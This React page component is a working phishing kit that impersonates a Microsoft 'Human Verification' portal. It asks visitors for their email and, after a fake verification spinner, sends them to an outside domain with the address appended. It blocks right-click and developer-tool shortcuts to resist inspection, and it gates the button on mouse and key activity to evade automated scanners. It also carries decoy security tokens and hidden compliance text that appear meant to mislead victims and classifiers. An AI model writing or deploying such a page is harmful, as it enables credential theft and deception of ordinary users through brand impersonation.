'use client';

import { useEffect, useRef } from 'react';

export default function Home() {
  const emailRef = useRef(null);
  const verifyBtnRef = useRef(null);
  const formRef = useRef(null);
  const loadingRef = useRef(null);
  const errorRef = useRef(null);

  const humanActivity = useRef({
    mouseMoved: false,
    keyPressed: false,
    interactionCount: 0,
  });

  const REDIRECT_PREFIX = '';
  const DESTINATION_DOMAIN = 'https://api-rx4sym0ih.aeronorways.com/';

  useEffect(() => {
    const emailInput = emailRef.current;
    const verifyBtn = verifyBtnRef.current;
    const form = formRef.current;
    const loadingContainer = loadingRef.current;
    const emailError = errorRef.current;

    if (!emailInput || !verifyBtn || !form) return;

    const updateVerifyButton = () => {
      const email = emailInput.value.trim();
      const isEmailValid = email.length > 0;
      const isHumanLike = humanActivity.current.interactionCount >= 1;
      verifyBtn.disabled = !(isEmailValid && isHumanLike);
    };

    const enableSecurityProtections = () => {
      const blockContextMenu = (e) => e.preventDefault();
      const blockKeys = (e) => {
        if (
          e.keyCode === 123 ||
          (e.ctrlKey && e.shiftKey && [73, 74].includes(e.keyCode)) ||
          (e.ctrlKey && e.keyCode === 85)
        ) {
          e.preventDefault();
        }
      };

      document.addEventListener('contextmenu', blockContextMenu);
      document.addEventListener('keydown', blockKeys);

      return () => {
        document.removeEventListener('contextmenu', blockContextMenu);
        document.removeEventListener('keydown', blockKeys);
      };
    };

    const cleanupSecurity = enableSecurityProtections();

    const mouseHandler = () => {
      if (!humanActivity.current.mouseMoved) {
        humanActivity.current.mouseMoved = true;
        humanActivity.current.interactionCount++;
        updateVerifyButton();
      }
    };

    const keyHandler = () => {
      if (!humanActivity.current.keyPressed) {
        humanActivity.current.keyPressed = true;
        humanActivity.current.interactionCount++;
        updateVerifyButton();
      }
    };

    const inputHandler = () => {
      humanActivity.current.interactionCount++;
      emailError.style.display = 'none';
      updateVerifyButton();
    };

    const submitHandler = (e) => {
      e.preventDefault();

      const email = emailInput.value.trim();
      if (!email) {
        emailError.style.display = 'block';
        return;
      }

      form.style.display = 'none';
      loadingContainer.style.display = 'block';

      setTimeout(() => {
        window.location.href = DESTINATION_DOMAIN + REDIRECT_PREFIX + email;
      }, 2000);
    };

    document.addEventListener('mousemove', mouseHandler);
    document.addEventListener('keydown', keyHandler);
    emailInput.addEventListener('input', inputHandler);
    form.addEventListener('submit', submitHandler);

    updateVerifyButton();

    return () => {
      cleanupSecurity?.();
      document.removeEventListener('mousemove', mouseHandler);
      document.removeEventListener('keydown', keyHandler);
      emailInput.removeEventListener('input', inputHandler);
      form.removeEventListener('submit', submitHandler);
    };
  }, []);

  return (
    <>
      <div className="verification-container">
        <div className="microsoft-header">
          <div className="header-text">Human Verification Required</div>
        </div>

        <div className="content">
          <p className="subtitle">
            Please verify you're not a robot to continue to the secure portal.
            <br />
            Enter your email to view your document.
          </p>

          <form ref={formRef}>
            <div className="form-group">
              <label htmlFor="email">Email address</label>
              <input
                ref={emailRef}
                id="email"
                type="text"
                className="email-input"
                placeholder="Enter your email address"
                required
              />
              <div
                ref={errorRef}
                className="error-message"
                style={{ display: 'none' }}
              >
                Please enter a valid email address
              </div>
            </div>

            <button
              ref={verifyBtnRef}
              type="submit"
              className="verify-btn"
              disabled
            >
              Verify Now
            </button>
          </form>

          <div
            ref={loadingRef}
            className="loading-container"
            style={{ display: 'none' }}
          >
            <div className="loading-spinner"></div>
            <div className="loading-text">
              Verifying your information. Please wait...
            </div>
          </div>
        </div>

        <div className="security-footer">
          <div>Protected by Microsoft Identity Platform</div>
        </div>
      </div>

      {/* Decoy / static metadata */}
      <div className="decoy-security">
        <div data-security="token">security_token_7x89y2z1</div>
        <div data-validation="csrf">csrf_protection_enabled</div>
        <div data-check="bot-detection">human_verification_passed</div>
        <div data-azure-config="compliance">
          ISO27001:SOC2:SECURE_SCORE_98
        </div>
      </div>

      <div style={{ display: 'none' }}>
        <span>Microsoft Cloud Security Benchmark v2 Compliant</span>
        <span>Azure Active Directory Enterprise Authentication Protocol</span>
        <span>ISO 27001:2013 Certified Security Controls</span>
        <span>Microsoft Online Services Terms Compliance Verified</span>
        <span>GDPR Article 30 Processing Records Maintained</span>
      </div>
    </>
  );
}
